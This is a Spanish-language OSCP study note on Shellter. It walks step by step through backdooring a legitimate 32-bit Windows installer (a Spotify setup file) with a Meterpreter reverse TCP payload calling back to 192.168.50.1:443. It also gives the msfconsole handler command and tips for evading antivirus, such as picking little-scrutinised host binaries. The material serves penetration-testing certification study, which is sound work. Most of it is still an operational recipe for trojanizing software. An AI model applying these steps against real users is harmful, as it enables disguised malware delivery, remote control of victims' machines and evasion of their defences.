---
tipo: tecnica
fase: evasion
so: windows
tags: [oscp, tecnica, evasion, explotacion, windows]
fecha: 2026-10-05
---

# Shellter

> [!abstract] Qué es y cuándo usarla
> Herramienta gratuita que **backdoorea un PE legítimo** inyectando shellcode en sus rutas de ejecución y reutilizando la **IAT** (no crea secciones ni cambia permisos → evade firmas típicas). Úsala para evasión **on-disk** automatizada cuando quieres entregar un ejecutable aparentemente inofensivo. Gratis solo **32-bit** (Pro soporta 64-bit).

## Requisitos previos
```bash
sudo apt install shellter
# corre bajo Windows -> wine
sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
```
- Un **PE legítimo 32-bit** como host (mejor uno **poco escrutado**, no uno famoso en engagements reales).

## Pasos
```bash
shellter        # abre la consola bajo wine
```
```text
Choose Operation Mode - Auto/Manual (A/M/H): A      # Auto
PE Target: /home/kali/Downloads/SpotifyFullWin10-32bit.exe
    Backup: Shellter_Backups\spotifysetup.exe       # crea backup del original
Enable Stealth Mode? (Y/N/H): Y                     # restaura el flujo normal del PE
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1                          # Meterpreter_Reverse_TCP
SET LHOST: 192.168.50.1
SET LPORT: 443
    Injection: Verified!                            # verifica que alcanza la 1ª instrucción
```
Handler en Kali y entregar el PE infectado:
```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

| Parte | Qué hace |
|---|---|
| **Auto mode** (`A`) | Shellter elige dónde inyectar automáticamente (Manual = control granular) |
| **Stealth Mode** | Restaura la ejecución del PE tras el payload → el programa legítimo funciona normal |
| IAT reuse | Usa funciones ya importadas por el PE para alloc/transfer/exec (menos sospechoso) |
| `-L` / índice payload | Elegir payload de la lista (Meterpreter/Shell/WinExec) |

> [!warning] Detección / problemas
> - Gratis solo **32-bit** → usa un host PE de 32 bits.
> - En **Win11**, los payloads **no-Meterpreter** fallaron → usa **Meterpreter**.
> - Con **custom payloads** + Stealth, el payload debe terminar **saliendo del hilo** o no restaura el flujo.
> - Si el PE lanza un **proceso hijo** antes del punto de inyección, el código corre en ese hijo y Shellter no lo controla.
> - Elige binarios **poco conocidos** (los famosos están muy analizados por los AV).

## Visto en
- Módulo: [[15 - Antivirus Evasion]]
- Relacionado: [[Evasion AV con PowerShell (Thread Injection)]]
- Máquinas: [[]]
